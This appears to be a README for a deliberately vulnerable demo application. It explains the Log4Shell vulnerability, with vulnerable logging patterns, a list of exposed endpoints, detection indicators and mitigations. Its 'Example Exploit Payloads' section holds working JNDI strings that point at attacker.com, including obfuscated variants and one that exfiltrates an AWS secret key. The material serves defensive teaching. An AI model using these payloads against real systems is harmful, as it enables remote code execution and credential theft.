# Log4Shell Exploit Demonstration

> ⚠️ **WARNING**: This document is for EDUCATIONAL PURPOSES ONLY. Never attempt these attacks against systems you do not own or have explicit permission to test.

## Overview

This directory contains information about how the Log4Shell vulnerability (CVE-2021-44228) can be exploited. This is provided to help security researchers and developers understand the threat and verify that their remediations are effective.

## The Vulnerability

Log4Shell exploits the JNDI (Java Naming and Directory Interface) lookup feature in Log4j 2.x versions prior to 2.17.0. When Log4j processes a log message containing a JNDI lookup string, it will attempt to resolve the reference, potentially loading and executing malicious code from a remote server.

### Attack Flow

```
┌──────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│   Attacker       │     │   Vulnerable     │     │   Malicious      │
│                  │     │   Application    │     │   LDAP Server    │
└────────┬─────────┘     └────────┬─────────┘     └────────┬─────────┘
         │                        │                        │
         │ 1. Send malicious      │                        │
         │    input with JNDI     │                        │
         │    lookup string       │                        │
         │───────────────────────>│                        │
         │                        │                        │
         │                        │ 2. Log4j processes     │
         │                        │    the message and     │
         │                        │    performs JNDI       │
         │                        │    lookup              │
         │                        │───────────────────────>│
         │                        │                        │
         │                        │ 3. LDAP server returns │
         │                        │    malicious payload   │
         │                        │<───────────────────────│
         │                        │                        │
         │                        │ 4. Application loads   │
         │                        │    and executes        │
         │                        │    malicious code      │
         │                        │                        │
```

## Vulnerable Code Patterns

### Pattern 1: Direct String Concatenation
```java
// VULNERABLE: User input directly concatenated into log message
String userInput = request.getParameter("search");
logger.info("User searched for: " + userInput);
```

### Pattern 2: Logging HTTP Headers
```java
// VULNERABLE: HTTP headers can be controlled by attacker
String userAgent = request.getHeader("User-Agent");
logger.info("Request from: " + userAgent);
```

### Pattern 3: Logging Form Data
```java
// VULNERABLE: Form data directly logged
String username = request.getParameter("username");
logger.info("Login attempt for user: " + username);
```

## Example Exploit Payloads

> These payloads are shown for educational purposes only.

### Basic JNDI Lookup
```
${jndi:ldap://attacker.com/exploit}
```

### With Environment Variable Exfiltration
```
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}
```

### Obfuscated Payloads
```
${${lower:j}ndi:${lower:l}dap://attacker.com/exploit}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/exploit}
```

### Nested Lookups
```
${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://attacker.com/exploit}
```

## Testing Your Remediation (Safe Methods)

### Method 1: DNS Canary Token
Use a DNS canary token to detect if JNDI lookups are being performed:

1. Get a free canary token from https://canarytokens.org/generate
2. Use the token in your test payload
3. If you receive an alert, JNDI lookups are still enabled

Example (using fictional canary):
```bash
curl -X GET "http://localhost:8080/api/products/search?query=\${jndi:ldap://test.canarytokens.com/a}"
```

### Method 2: Local Log Inspection
Check if the JNDI lookup string appears unchanged in logs:

**Vulnerable behavior**: Log contains the resolved value or error about JNDI
**Fixed behavior**: Log contains the literal string `${jndi:...}` or nothing

### Method 3: Dependency Scanner
```bash
# Run OWASP Dependency-Check
mvn org.owasp:dependency-check-maven:check

# Check for vulnerable Log4j versions
mvn dependency:tree | grep log4j
```

## Common Attack Vectors in This Application

| Endpoint | Parameter | Risk Level |
|----------|-----------|------------|
| `/api/products/search` | `query` | CRITICAL |
| `/api/auth/login` | `username` | CRITICAL |
| `/api/orders/track/{trackingNumber}` | Path variable | HIGH |
| `/api/products/{id}/reviews` | `reviewText` | HIGH |
| `/api/orders` | `shippingAddress`, `notes` | HIGH |

## Indicators of Compromise (IoC)

### Log Patterns to Monitor
- Outbound connections to unusual LDAP/RMI/DNS servers
- Log entries containing `${jndi:` patterns
- Java classloading errors for unexpected classes
- Sudden spikes in external DNS queries

### Network Indicators
- Outbound traffic on ports 1389, 1099 (LDAP/RMI)
- DNS queries for suspicious domains
- Unusual outbound traffic from Java processes

## Immediate Mitigation Steps

1. **Update Log4j** to version 2.17.1 or later
2. **Set system property**: `log4j2.formatMsgNoLookups=true`
3. **Remove JndiLookup class**: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
4. **Use WAF rules** to block JNDI lookup patterns
5. **Network segmentation** to prevent outbound LDAP/RMI traffic

## References

- [CVE-2021-44228 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Advisories](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Log4Shell Guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
- [Hunting for Log4Shell - Microsoft](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/)

---

**Remember**: This information is provided to help defenders understand and protect against Log4Shell. Always obtain proper authorization before testing any security controls.
